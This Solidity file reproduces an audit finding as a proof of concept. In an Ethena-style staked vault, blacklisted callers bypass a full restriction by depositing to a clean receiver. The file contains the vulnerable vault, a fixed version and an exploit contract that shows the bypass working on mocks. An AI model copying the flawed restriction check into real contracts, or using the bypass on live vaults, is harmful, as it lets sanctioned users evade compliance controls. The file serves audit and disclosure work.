// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of ManifestFinance finding 62716 (Kann
// Audits H-01): "FULL-Restricted Users Can Still Deposit".
//
// This is an Ethena sUSDe-style staked-vault. Compliance restriction is enforced
// by an ERC20 `_update` override that reverts any transfer whose `from` OR `to`
// carries FULL_RESTRICTED_STAKER_ROLE. But the ERC20 `_mint` path calls
// `_update(address(0), receiver, value)` — it passes `address(0)` as `from` and
// never references the CALLER (msg.sender). So a FULL_RESTRICTED (blacklisted /
// sanctioned) user can still call `deposit(assets, cleanReceiver)`: their assets
// enter the vault and shares are minted to a clean address they control, fully
// bypassing the restriction that should block them.
//
// The vulnerable `_deposit`, `_mint`, and the `_update` override are inlined
// VERBATIM from the finding. The bug is the omission of any caller/msg.sender
// check on the mint path — marked with `// @>` below.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @dev Minimal faithful double for OpenZeppelin's SafeERC20.safeTransferFrom.
library SafeERC20 {
    error SafeERC20FailedOperation(address token);

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        bool success = token.transferFrom(from, to, value);
        if (!success) revert SafeERC20FailedOperation(address(token));
    }
}

/// @dev Minimal faithful plain ERC20 used as the underlying asset (and as the
///      harm MARKER token). Not the restricted vault — a normal, unrestricted
///      token, so a restricted user CAN hold and approve it.
contract MiniToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Minimal faithful AccessControl (hasRole + internal grant).
abstract contract AccessControl {
    mapping(bytes32 => mapping(address => bool)) private _roles;

    function hasRole(bytes32 role, address account) public view returns (bool) {
        return _roles[role][account];
    }

    function _grantRole(bytes32 role, address account) internal {
        _roles[role][account] = true;
    }

    /// @notice Harness-only role setter. Real code gates this behind
    ///         DEFAULT_ADMIN_ROLE; not the subject of the finding.
    function grantRoleForTest(bytes32 role, address account) external {
        _grantRole(role, account);
    }
}

/// @dev Minimal faithful OZ-style ERC20 core with a virtual `_update` and the
///      verbatim `_mint` from the finding.
abstract contract ERC20 {
    error ERC20InvalidReceiver(address receiver);
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name;
    string public symbol;
    uint8 public constant decimals = 18;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) revert ERC20InsufficientBalance(from, fromBalance, value);
            unchecked {
                _balances[from] = fromBalance - value;
            }
        }
        if (to == address(0)) {
            unchecked {
                _totalSupply -= value;
            }
        } else {
            unchecked {
                _balances[to] += value;
            }
        }
        emit Transfer(from, to, value);
    }

    // ── VERBATIM from the finding ────────────────────────────────────────────
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }
    // ─────────────────────────────────────────────────────────────────────────
}

/// @dev Minimal faithful OZ-style ERC4626 with the verbatim base `_deposit`.
abstract contract ERC4626 is ERC20 {
    event Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares);

    IERC20 private immutable _asset;

    constructor(IERC20 asset_) {
        _asset = asset_;
    }

    function asset() public view returns (address) {
        return address(_asset);
    }

    function totalAssets() public view returns (uint256) {
        return _asset.balanceOf(address(this));
    }

    function previewDeposit(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply();
        uint256 totalA = totalAssets();
        if (supply == 0 || totalA == 0) return assets; // 1:1 on first / empty
        return assets * supply / totalA;
    }

    function deposit(uint256 assets, address receiver) public virtual returns (uint256) {
        uint256 shares = previewDeposit(assets);
        _deposit(_msgSender(), receiver, assets, shares);
        return shares;
    }

    // ── VERBATIM from the finding (base ERC4626 _deposit) ─────────────────────
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal virtual {
        SafeERC20.safeTransferFrom(IERC20(asset()), caller, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(caller, receiver, assets, shares);
    }
    // ─────────────────────────────────────────────────────────────────────────
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE vault (Ethena sUSDe / StakedUSDe-style). The FULL_RESTRICTED check
// lives ONLY in the `_update` override, which the mint path bypasses for the
// caller.
// ─────────────────────────────────────────────────────────────────────────────
contract Vault is ERC4626, AccessControl {
    bytes32 public constant SOFT_RESTRICTED_STAKER_ROLE = keccak256("SOFT_RESTRICTED_STAKER_ROLE");
    bytes32 public constant FULL_RESTRICTED_STAKER_ROLE = keccak256("FULL_RESTRICTED_STAKER_ROLE");

    error OperationNotAllowed();

    constructor(IERC20 asset_, string memory _name, string memory _symbol) ERC4626(asset_) ERC20(_name, _symbol) {}

    /// @dev SOFT-restriction gate on the deposit path (Ethena StakedUSDe style):
    ///      only blocks SOFT_RESTRICTED caller/receiver, then defers to the base
    ///      _deposit. FULL restriction is expected to be enforced elsewhere.
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
        if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {
            revert OperationNotAllowed();
        }
        super._deposit(caller, receiver, assets, shares);
    }

    // ── VERBATIM from the finding ────────────────────────────────────────────
    function _update(address from, address to, uint256 value) internal override {
        if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) { // @> only `from`/`to` are gated; the mint path passes from=address(0), so a FULL_RESTRICTED msg.sender/caller is never checked → bypass
            revert OperationNotAllowed();
        }
        if (hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {
            revert OperationNotAllowed();
        }
        super._update(from, to, value);
    }
    // ─────────────────────────────────────────────────────────────────────────
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED vault: identical, plus a caller-side FULL_RESTRICTED check on the
// deposit path so a blacklisted caller can no longer mint to a clean receiver.
// ─────────────────────────────────────────────────────────────────────────────
contract VaultFixed is ERC4626, AccessControl {
    bytes32 public constant SOFT_RESTRICTED_STAKER_ROLE = keccak256("SOFT_RESTRICTED_STAKER_ROLE");
    bytes32 public constant FULL_RESTRICTED_STAKER_ROLE = keccak256("FULL_RESTRICTED_STAKER_ROLE");

    error OperationNotAllowed();

    constructor(IERC20 asset_, string memory _name, string memory _symbol) ERC4626(asset_) ERC20(_name, _symbol) {}

    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
        // FIX: also block a FULL_RESTRICTED caller on the deposit/mint path.
        if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller)) {
            revert OperationNotAllowed();
        }
        if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {
            revert OperationNotAllowed();
        }
        super._deposit(caller, receiver, assets, shares);
    }

    function _update(address from, address to, uint256 value) internal override {
        if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) {
            revert OperationNotAllowed();
        }
        if (hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {
            revert OperationNotAllowed();
        }
        super._update(from, to, value);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: the Exploit contract is the FULL_RESTRICTED (blacklisted)
// caller. It deposits to a CLEAN receiver it controls; the deposit — which MUST
// revert — instead succeeds and mints shares to the clean address. The negative
// control (VaultFixed) reverts for the same caller. The illegitimately-minted
// share magnitude is recorded on a MARKER token to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    // Clean address (no restriction role) that the blacklisted caller controls.
    address internal constant CLEAN_RECEIVER = 0x0000000000000000000000000000000000002222;

    uint256 internal constant DEPOSIT_ASSETS = 1000 ether;

    // Exposed results.
    address public vaultAddr;
    address public fixedAddr;
    address public assetAddr;
    address public markerAddr;
    address public cleanReceiver;
    address public restrictedCaller;

    uint256 public mintedShares; // shares minted to the clean receiver via the buggy path
    bool public buggyDepositSucceeded;
    bool public fixedDepositReverted;
    uint256 public sinkMarkerBalance;

    function run() external payable {
        restrictedCaller = address(this); // the Exploit itself is FULL_RESTRICTED
        cleanReceiver = CLEAN_RECEIVER;

        // --- create every contract unconditionally, fixed order (marker LAST) ---
        MiniToken asset = new MiniToken("Manifest Asset", "mUSD");             // nonce 1
        Vault vault = new Vault(IERC20(address(asset)), "Staked Manifest", "sMANIFEST"); // nonce 2
        VaultFixed fixedVault =
            new VaultFixed(IERC20(address(asset)), "Staked Manifest Fixed", "sFIX");     // nonce 3
        MiniToken marker = new MiniToken("Role Bypass Marker", "BYPASS-SHARE"); // nonce 4 (LAST)

        vaultAddr = address(vault);
        fixedAddr = address(fixedVault);
        assetAddr = address(asset);
        markerAddr = address(marker);

        // --- blacklist (FULL_RESTRICTED) the caller in BOTH vaults ---
        vault.grantRoleForTest(vault.FULL_RESTRICTED_STAKER_ROLE(), address(this));
        fixedVault.grantRoleForTest(fixedVault.FULL_RESTRICTED_STAKER_ROLE(), address(this));

        // --- fund the restricted caller with the (unrestricted) asset + approve ---
        asset.mint(address(this), DEPOSIT_ASSETS * 2);
        asset.approve(address(vault), type(uint256).max);
        asset.approve(address(fixedVault), type(uint256).max);

        // --- BUGGY path: blacklisted caller deposits to a CLEAN receiver → SUCCEEDS ---
        mintedShares = vault.deposit(DEPOSIT_ASSETS, cleanReceiver);
        buggyDepositSucceeded = true; // only reached if deposit did NOT revert
        require(mintedShares == DEPOSIT_ASSETS, "unexpected share amount (expected 1:1)");
        require(vault.balanceOf(cleanReceiver) == mintedShares, "shares not minted to clean receiver");
        // Sanity: the caller genuinely holds the FULL_RESTRICTED role that should have blocked it.
        require(vault.hasRole(vault.FULL_RESTRICTED_STAKER_ROLE(), address(this)), "caller not restricted");

        // --- NEGATIVE CONTROL: fixed vault reverts for the SAME restricted caller ---
        try fixedVault.deposit(DEPOSIT_ASSETS, cleanReceiver) returns (uint256) {
            fixedDepositReverted = false;
        } catch {
            fixedDepositReverted = true;
        }
        require(fixedDepositReverted, "fixed vault failed to block the restricted caller");

        // --- record the illegitimately-minted magnitude on the MARKER at the SINK ---
        marker.mint(SINK, mintedShares);
        sinkMarkerBalance = marker.balanceOf(SINK);

        require(buggyDepositSucceeded && fixedDepositReverted, "harm not demonstrated");
    }
}
